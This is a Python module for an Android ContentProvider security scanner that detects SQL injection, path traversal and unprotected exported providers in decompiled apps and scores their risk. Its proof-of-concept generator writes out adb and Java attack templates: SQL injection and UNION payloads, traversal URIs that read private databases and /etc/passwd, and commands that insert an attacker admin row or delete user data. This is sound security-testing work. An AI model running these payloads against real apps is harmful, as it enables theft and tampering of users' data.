"""
Content Provider Deep Analyzer - Analyzes ContentProvider security.

Analyzes:
- Path traversal in openFile/query
- SQL injection in query/update/delete
- Permission bypass
- Exported providers with sensitive data
"""

import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from pathlib import Path


@dataclass
class ProviderMethod:
    """A ContentProvider method implementation."""
    name: str  # query, insert, update, delete, openFile, call
    start_line: int
    end_line: int
    params_used: List[str]  # Which parameters are used
    has_path_validation: bool = False
    has_sql_parameterization: bool = False
    raw_sql_usage: bool = False
    path_traversal_possible: bool = False
    code_body: str = ""


@dataclass
class ProviderFinding:
    """Content Provider security finding."""
    file_path: str
    class_name: str
    authority: Optional[str]
    is_exported: bool
    grant_uri_permissions: bool
    path_permissions: List[Dict]
    methods: List[ProviderMethod]
    vulnerabilities: List[Dict]
    deep_poc: str
    risk_score: int


class ContentProviderAnalyzer:
    """
    Deep analyzer for ContentProvider security issues.
    """

    def __init__(self, decompiled_path: str, manifest_data: Dict):
        self.decompiled_path = Path(decompiled_path)
        self.manifest = manifest_data
        self.package_name = manifest_data.get('package', '')

        # Parse provider info from manifest
        self.providers = self._parse_providers()

    def _parse_providers(self) -> Dict[str, Dict]:
        """Parse ContentProvider info from manifest."""
        providers = {}

        for prov in self.manifest.get('providers', []):
            name = prov.get('name', '')
            providers[name] = {
                'authority': prov.get('authorities', ''),
                'exported': prov.get('exported', False),
                'grantUriPermissions': prov.get('grantUriPermissions', False),
                'readPermission': prov.get('readPermission'),
                'writePermission': prov.get('writePermission'),
                'pathPermissions': prov.get('pathPermissions', []),
            }

        return providers

    def analyze_file(self, file_path: str) -> Optional[ProviderFinding]:
        """Analyze a ContentProvider implementation."""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                lines = content.split('\n')
        except:
            return None

        # Check if this is a ContentProvider
        if not self._is_content_provider(content):
            return None

        class_name = self._extract_class_name(content)
        package = self._extract_package(content)
        full_name = f"{package}.{class_name}"

        # Get manifest info
        provider_info = self.providers.get(full_name, {})

        # Analyze methods
        methods = self._analyze_provider_methods(content, lines)

        if not methods:
            return None

        # Identify vulnerabilities
        vulns = self._identify_vulnerabilities(methods, provider_info)

        # Generate PoC
        poc = self._generate_poc(
            class_name, full_name, provider_info,
            methods, vulns
        )

        return ProviderFinding(
            file_path=file_path,
            class_name=class_name,
            authority=provider_info.get('authority'),
            is_exported=provider_info.get('exported', False),
            grant_uri_permissions=provider_info.get('grantUriPermissions', False),
            path_permissions=provider_info.get('pathPermissions', []),
            methods=methods,
            vulnerabilities=vulns,
            deep_poc=poc,
            risk_score=self._calculate_risk(vulns, provider_info),
        )

    def _is_content_provider(self, content: str) -> bool:
        """Check if this file is a ContentProvider."""
        patterns = [
            r'extends\s+ContentProvider\b',
            r'extends\s+FileProvider\b',
            r'extends\s+DocumentsProvider\b',
            r'import\s+android\.content\.ContentProvider\s*;',
        ]
        return any(re.search(p, content) for p in patterns)

    def _analyze_provider_methods(self, content: str, lines: List[str]) -> List[ProviderMethod]:
        """Analyze ContentProvider method implementations."""
        methods = []

        # Methods to analyze
        method_names = ['query', 'insert', 'update', 'delete', 'openFile',
                        'openAssetFile', 'call', 'getType']

        for method_name in method_names:
            method = self._find_method(content, method_name)
            if method:
                methods.append(method)

        return methods

    def _find_method(self, content: str, method_name: str) -> Optional[ProviderMethod]:
        """Find and analyze a specific method."""
        # Pattern to match method declaration
        pattern = rf'(?:public|protected)\s+\S+\s+{method_name}\s*\([^)]*\)\s*(?:throws\s+[\w,\s]+)?\s*\{{'

        match = re.search(pattern, content)
        if not match:
            return None

        start_line = content[:match.start()].count('\n') + 1

        # Extract method body
        body_start = match.end() - 1
        body, body_end = self._extract_body(content, body_start)
        end_line = content[:body_start + len(body)].count('\n') + 1

        method = ProviderMethod(
            name=method_name,
            start_line=start_line,
            end_line=end_line,
            params_used=[],
            code_body=body,
        )

        # Analyze method body
        self._analyze_method_body(method, body)

        return method

    def _extract_body(self, content: str, start: int) -> Tuple[str, int]:
        """Extract method body with brace matching."""
        depth = 0
        i = start
        while i < len(content):
            if content[i] == '{':
                depth += 1
            elif content[i] == '}':
                depth -= 1
                if depth == 0:
                    return content[start:i+1], i
            i += 1
        return content[start:], len(content)

    def _analyze_method_body(self, method: ProviderMethod, body: str):
        """Analyze method body for vulnerabilities."""

        # Check for parameter usage
        if method.name in ['query', 'update', 'delete']:
            # Check if selection parameter is used directly in SQL
            if re.search(r'rawQuery\s*\([^)]*selection', body, re.IGNORECASE):
                method.raw_sql_usage = True
            if re.search(r'execSQL\s*\([^)]*selection', body, re.IGNORECASE):
                method.raw_sql_usage = True

            # Check for parameterization
            if re.search(r'selectionArgs', body):
                method.has_sql_parameterization = True

        if method.name in ['openFile', 'openAssetFile']:
            # Check for path traversal protection
            if re.search(r'canonical|normalize|contains\s*\(\s*["\']\.\.', body, re.IGNORECASE):
                method.has_path_validation = True
            else:
                # Check if uri.getPath() or uri.getLastPathSegment() used directly with File
                if re.search(r'uri\s*\.\s*(?:getPath|getLastPathSegment)\s*\(\s*\)', body):
                    if re.search(r'new\s+File\s*\(', body):
                        method.path_traversal_possible = True

    def _identify_vulnerabilities(self, methods: List[ProviderMethod],
                                   provider_info: Dict) -> List[Dict]:
        """Identify vulnerabilities based on method analysis."""
        vulns = []

        is_exported = provider_info.get('exported', False)
        grant_uri = provider_info.get('grantUriPermissions', False)

        for method in methods:
            # SQL Injection in query/update/delete
            if method.name in ['query', 'update', 'delete']:
                if method.raw_sql_usage and not method.has_sql_parameterization:
                    vulns.append({
                        'type': 'SQL_INJECTION',
                        'severity': 'Critical' if is_exported else 'High',
                        'method': method.name,
                        'line': method.start_line,
                        'title': f'SQL Injection in {method.name}()',
                        'description': f'The {method.name}() method uses raw SQL with user-provided '
                                     f'selection parameter without proper parameterization.',
                    })

            # Path Traversal in openFile
            if method.name in ['openFile', 'openAssetFile']:
                if method.path_traversal_possible and not method.has_path_validation:
                    vulns.append({
                        'type': 'PATH_TRAVERSAL',
                        'severity': 'Critical' if is_exported else 'High',
                        'method': method.name,
                        'line': method.start_line,
                        'title': f'Path Traversal in {method.name}()',
                        'description': f'The {method.name}() method uses URI path directly in file '
                                     f'operations without path traversal protection.',
                    })

        # Exported provider without protection
        if is_exported and not provider_info.get('readPermission') and not provider_info.get('writePermission'):
            vulns.append({
                'type': 'UNPROTECTED_EXPORT',
                'severity': 'High',
                'method': 'manifest',
                'line': 0,
                'title': 'Exported Provider Without Permission',
                'description': 'ContentProvider is exported without read/write permission protection. '
                             'Any app can access its data.',
            })

        # Grant URI permissions without path restrictions
        if grant_uri and not provider_info.get('pathPermissions'):
            vulns.append({
                'type': 'GRANT_URI_ALL',
                'severity': 'Medium',
                'method': 'manifest',
                'line': 0,
                'title': 'Grant URI Permissions Without Path Restriction',
                'description': 'grantUriPermissions=true without path-permission restrictions allows '
                             'granting access to all provider URIs.',
            })

        return vulns

    def _generate_poc(self, class_name: str, full_name: str,
                      provider_info: Dict, methods: List[ProviderMethod],
                      vulns: List[Dict]) -> str:
        """Generate ContentProvider exploitation PoC."""
        lines = []
        package = self.package_name
        authority = provider_info.get('authority', f'{package}.provider')

        lines.append("# " + "=" * 60)
        lines.append("# CONTENT PROVIDER DEEP ANALYSIS - PROOF OF CONCEPT")
        lines.append("# " + "=" * 60)
        lines.append("")

        lines.append(f"# Provider: {full_name}")
        lines.append(f"# Authority: {authority}")
        lines.append(f"# Exported: {'YES ⚠️' if provider_info.get('exported') else 'NO'}")
        lines.append(f"# Grant URI Permissions: {'YES' if provider_info.get('grantUriPermissions') else 'NO'}")
        lines.append("")

        # Generate exploits for each vulnerability
        for vuln in vulns:
            lines.append("# " + "-" * 40)
            lines.append(f"# VULNERABILITY: {vuln['title']}")
            lines.append(f"# Severity: {vuln['severity']}")
            lines.append("# " + "-" * 40)
            lines.append("")

            if vuln['type'] == 'SQL_INJECTION':
                lines.append("# === SQL Injection Attack ===")
                lines.append("# The selection parameter is concatenated into SQL query")
                lines.append("")
                lines.append("# Step 1: Extract all data")
                lines.append(f"adb shell content query --uri content://{authority}/users \\")
                lines.append(f"    --where \"1=1) OR (1=1\"")
                lines.append("")
                lines.append("# Step 2: UNION-based extraction")
                lines.append(f"adb shell content query --uri content://{authority}/users \\")
                lines.append(f"    --where \"') UNION SELECT username,password FROM users--\"")
                lines.append("")
                lines.append("# Step 3: Using content provider client (Java):")
                lines.append("# ```java")
                lines.append(f"# Uri uri = Uri.parse(\"content://{authority}/users\");")
                lines.append("# String selection = \"') UNION SELECT * FROM secrets--\";")
                lines.append("# Cursor c = getContentResolver().query(uri, null, selection, null, null);")
                lines.append("# ```")
                lines.append("")

            elif vuln['type'] == 'PATH_TRAVERSAL':
                lines.append("# === Path Traversal Attack ===")
                lines.append("# openFile() doesn't validate path, allowing arbitrary file read")
                lines.append("")
                lines.append("# Step 1: Read app's shared preferences")
                lines.append(f"adb shell content read --uri content://{authority}/..%2F..%2F..%2Fdata%2Fdata%2F{package}%2Fshared_prefs%2Fprefs.xml")
                lines.append("")
                lines.append("# Step 2: Read database file")
                lines.append(f"adb shell content read --uri content://{authority}/..%2F..%2F..%2Fdata%2Fdata%2F{package}%2Fdatabases%2Fdata.db")
                lines.append("")
                lines.append("# Step 3: Exploit from malicious app (Java):")
                lines.append("# ```java")
                lines.append(f"# Uri uri = Uri.parse(\"content://{authority}/../../../data/data/{package}/files/secret.txt\");")
                lines.append("# InputStream is = getContentResolver().openInputStream(uri);")
                lines.append("# // Read file contents...")
                lines.append("# ```")
                lines.append("")
                lines.append("# Step 4: File scheme variant")
                lines.append(f"adb shell content read --uri content://{authority}/file:///etc/passwd")
                lines.append("")

            elif vuln['type'] == 'UNPROTECTED_EXPORT':
                lines.append("# === Unprotected Exported Provider ===")
                lines.append("# Any app can query/modify this provider's data")
                lines.append("")
                lines.append("# List all data:")
                lines.append(f"adb shell content query --uri content://{authority}/")
                lines.append("")
                lines.append("# Try common paths:")
                for path in ['users', 'accounts', 'data', 'settings', 'tokens', 'credentials']:
                    lines.append(f"adb shell content query --uri content://{authority}/{path}")
                lines.append("")
                lines.append("# Insert malicious data:")
                lines.append(f"adb shell content insert --uri content://{authority}/users \\")
                lines.append("    --bind name:s:attacker --bind role:s:admin")
                lines.append("")
                lines.append("# Delete data:")
                lines.append(f"adb shell content delete --uri content://{authority}/users \\")
                lines.append("    --where \"name='victim'\"")
                lines.append("")

            elif vuln['type'] == 'GRANT_URI_ALL':
                lines.append("# === URI Permission Grant Exploitation ===")
                lines.append("# App can grant access to all provider URIs")
                lines.append("")
                lines.append("# If app sends Intent with URI permission flag,")
                lines.append("# receiving app gains access to entire provider")
                lines.append("")
                lines.append("# Malicious receiver code:")
                lines.append("# ```java")
                lines.append("# // In malicious app's Activity")
                lines.append("# Uri grantedUri = getIntent().getData();")
                lines.append("# // App now has access to read from provider")
                lines.append(f"# Uri sensitiveUri = Uri.parse(\"content://{authority}/secrets\");")
                lines.append("# Cursor c = getContentResolver().query(sensitiveUri, null, null, null, null);")
                lines.append("# ```")
                lines.append("")

        # Method-specific analysis
        lines.append("# " + "-" * 40)
        lines.append("# PROVIDER METHOD ANALYSIS")
        lines.append("# " + "-" * 40)
        lines.append("")

        for method in methods:
            status = []
            if method.raw_sql_usage:
                status.append("RAW SQL ⚠️")
            if method.has_sql_parameterization:
                status.append("PARAMETERIZED ✓")
            if method.path_traversal_possible:
                status.append("PATH TRAVERSAL POSSIBLE ⚠️")
            if method.has_path_validation:
                status.append("PATH VALIDATED ✓")

            lines.append(f"# {method.name}() [Lines {method.start_line}-{method.end_line}]")
            if status:
                lines.append(f"#   Status: {', '.join(status)}")
            lines.append("")

        return '\n'.join(lines)

    def _calculate_risk(self, vulns: List[Dict], provider_info: Dict) -> int:
        """Calculate risk score."""
        score = 0

        is_exported = provider_info.get('exported', False)

        for vuln in vulns:
            if vuln['severity'] == 'Critical':
                score += 35
            elif vuln['severity'] == 'High':
                score += 25
            elif vuln['severity'] == 'Medium':
                score += 15

        if is_exported:
            score += 20

        return min(score, 100)

    def _extract_class_name(self, content: str) -> str:
        """Extract class name."""
        match = re.search(r'class\s+(\w+)', content)
        return match.group(1) if match else 'Unknown'

    def _extract_package(self, content: str) -> str:
        """Extract package name."""
        match = re.search(r'package\s+([\w.]+)\s*;', content)
        return match.group(1) if match else ''
